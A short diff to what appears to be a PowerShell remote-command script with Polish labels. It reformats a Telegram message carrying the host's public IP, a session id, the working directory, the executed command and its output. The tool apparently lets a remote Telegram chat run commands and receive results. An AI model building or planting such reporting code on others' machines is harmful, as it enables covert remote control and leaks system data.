@@ -72,7 +72,20 @@ function SendMessage($output, $cmd)
     $MessageToSend = @{
         chat_id    = $telegram_id
         parse_mode = "MarkdownV2"
-        text       = "```````nHost:`n$(Invoke-RestMethod -Uri "ident.me" -WebSession $session)`n`Sesja`n:$session_id`nŚcieżka`n:[$(((Get-Location).Path).Replace("\","/"))]`nPolecenie:`n$cmd`n`n$output`n``````"
+        text = @"
+```
+💻 *Host*: $(Invoke-RestMethod -Uri 'ident.me' -WebSession $session)
+
+🆔 *Sesja*: $session_id
+
+📂 *Ścieżka*: [$(((Get-Location).Path).Replace("\","/"))]
+
+💬 *Polecenie*:
+$cmd
+
+$output
+```
+"@
     }
 
     $MessageToSend = $MessageToSend | ConvertTo-Json
